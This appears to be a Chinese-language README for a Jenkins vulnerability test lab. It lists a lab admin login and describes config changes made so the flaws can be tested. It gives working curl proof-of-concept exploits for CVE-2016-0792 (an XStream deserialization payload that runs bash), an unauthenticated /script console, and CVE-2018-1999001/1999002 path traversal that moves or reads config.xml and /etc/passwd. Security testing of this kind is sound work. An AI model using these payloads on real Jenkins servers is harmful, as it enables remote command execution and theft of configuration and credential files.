## 环境说明

- src/jenkins/2.121/

  - 管理账号

    admin/admin

  - 配置修改

    为测试任意文件读取漏洞，修改了默认的global Security设置中的Authorization，添加了Allow anonymous read access权限

  - 添加目录

    为测试任意文件读取漏洞，在/root/.jenkins/plugins/credentials/_目录

  - 版本信息

    该环境为去除[补丁](https://github.com/jenkinsci/jenkins/commit/29ca81dd59c255ad633f1bd86cf1be40a5f02c64)前的某commit打包生成，并非官方发布的2.121版本

## CVE-2016-0792 - XStream 反序列化漏洞

测试镜像

* src/jenkins/1.636/

参考文档

* [Jenkins - XStream Groovy classpath Deserialization (Metasploit)](https://www.exploit-db.com/exploits/43375/)

Poc

```
# 复制 /etc/passwd 到 /tmp
curl 'http://127.0.0.1/createItem?name=boh3ti8AGh' --data-binary '<map><entry><groovy.util.Expando><expandoProperties><entry><string>hashCode</string><org.codehaus.groovy.runtime.MethodClosure><delegate class="groovy.util.Expando"reference="../../../.."/><owner class="java.lang.ProcessBuilder"><command><string>/bin/bash</string><string>-c</string><string>cp /etc/passwd /tmp</string></command><redirectErrorStream>false</redirectErrorStream></owner><resolveStrategy>0</resolveStrategy><directive>0</directive><parameterTypes/><maximumNumberOfParameters>0</maximumNumberOfParameters><method>start</method></org.codehaus.groovy.runtime.MethodClosure></entry></expandoProperties></groovy.util.Expando><int>1</int></entry></map>' -H 'Content-Type: application/xml'
```

## 运维安全 - /script 无认证

测试镜像

* src/jenkins/1.636/

访问 /script，执行如下内容

```
println "cat /etc/passwd 2>&1".execute().text
```



## Jenkins配置文件路径修改漏洞(CVE-2018-1999001)

测试镜像

- src/jenkins/2.121/

影响版本

- Jenkins weekly 2.89 ~ 2.132
- Jenkins LTS 2.73.3 ~ 2.121.1

参考

- [Jenkins配置文件路径改动导致管理员权限开放漏洞](https://paper.tuisec.win/detail/81c0aad88426f6d)

POC

```shell
curl -H "Authorization: Basic Li46YW55LXBhc3N3b3Jk" "http://172.17.0.2/login?from=%2f"
```

执行后应返回HTTP ERROR 401，此时根目录下的config.xml被转移到了/users/$002e$002e目录下，可以使用CVE-2018-1999002的POC验证：

```shell
curl -H "Accept-Language: /../../../config" http://172.17.0.2/plugin/credentials/.xml
```

结果为404则利用成功




## Jenkins 任意文件读取漏洞(CVE-2018-1999002)

测试镜像

* src/jenkins/2.121/

影响版本

* Jenkins weekly <= 2.132
* Jenkins LTS <= 2.121.1

特殊说明

- 适用于jetty，但不适用于tomcat

参考

* [ Jenkins 任意文件读取漏洞分析](https://mp.weixin.qq.com/s/T6s2yB92wTPiQnQ9FpJ3MQ)

POC

读取config.xml

```shell
curl -H "Accept-Language: /../../../config" http://172.17.0.2/plugin/credentials/.xml
```

返回xml文件则利用成功